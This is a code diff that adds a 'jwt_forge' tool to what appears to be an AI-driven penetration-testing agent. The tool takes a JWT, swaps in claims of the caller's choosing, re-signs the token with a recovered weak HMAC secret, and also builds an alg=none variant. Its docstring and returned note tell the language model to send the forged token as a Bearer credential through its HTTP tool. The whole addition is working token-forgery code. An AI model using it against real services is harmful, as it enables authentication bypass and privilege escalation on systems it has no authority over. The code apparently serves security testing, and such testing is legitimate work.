@@ -65,6 +65,60 @@ def jwt_decode(ctx: Context, token: str) -> dict:
     return out
 
 
+def _b64url_enc(raw: bytes) -> str:
+    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
+
+
+def jwt_forge(ctx: Context, token: str, claims: str = "{}",
+              secret: str = "") -> dict:
+    """Forge a JWT: re-sign the payload with a recovered weak secret, and/or
+    produce an alg=none variant. The LLM cannot compute HMAC - after
+    jwt_decode recovers a secret this tool is the only way to mint a valid
+    forged token to send back through http_request."""
+    token = token.strip().strip('"\'')
+    parts = token.split(".")
+    if len(parts) not in (2, 3):
+        return {"error": "not a JWT (expected 2 or 3 segments)"}
+    try:
+        header = json.loads(_b64url(parts[0]))
+        payload = json.loads(_b64url(parts[1]))
+    except (ValueError, json.JSONDecodeError) as exc:
+        return {"error": f"decode failed: {exc}"}
+    try:
+        overrides = json.loads(claims or "{}")
+        if not isinstance(overrides, dict):
+            raise ValueError("claims must be a JSON object")
+    except ValueError as exc:
+        return {"error": f"claims JSON invalid: {exc}"}
+    payload.update(overrides)
+
+    out: dict = {}
+    src_alg = (header.get("alg") or "").lower()
+    if secret:
+        if not src_alg.startswith("hs"):
+            return {"error": f"token is {header.get('alg')}; only HS* "
+                             "re-signing supported - try alg=none instead"}
+        h = dict(header)
+        p64 = _b64url_enc(json.dumps(payload, separators=(",", ":"))
+                          .encode())
+        h64 = _b64url_enc(json.dumps(h, separators=(",", ":")).encode())
+        algo = {"hs256": hashlib.sha256, "hs384": hashlib.sha384,
+                "hs512": hashlib.sha512}.get(src_alg, hashlib.sha256)
+        sig = _b64url_enc(_hmac.new(secret.encode(),
+                                    f"{h64}.{p64}".encode(),
+                                    algo).digest())
+        out["resigned"] = f"{h64}.{p64}.{sig}"
+    h_none = _b64url_enc(
+        json.dumps({**header, "alg": "none"},
+                   separators=(",", ":")).encode())
+    p64 = _b64url_enc(json.dumps(payload, separators=(",", ":")).encode())
+    out["alg_none"] = f"{h_none}.{p64}."
+    out["payload_used"] = payload
+    out["note"] = ("send 'resigned' or 'alg_none' as the Bearer token via "
+                   "http_request; a 200 echoing your claims is the finding")
+    return out
+
+
 # ---------------------------------------------------------------- skills
 
 def load_skill(ctx: Context, name: str) -> dict:
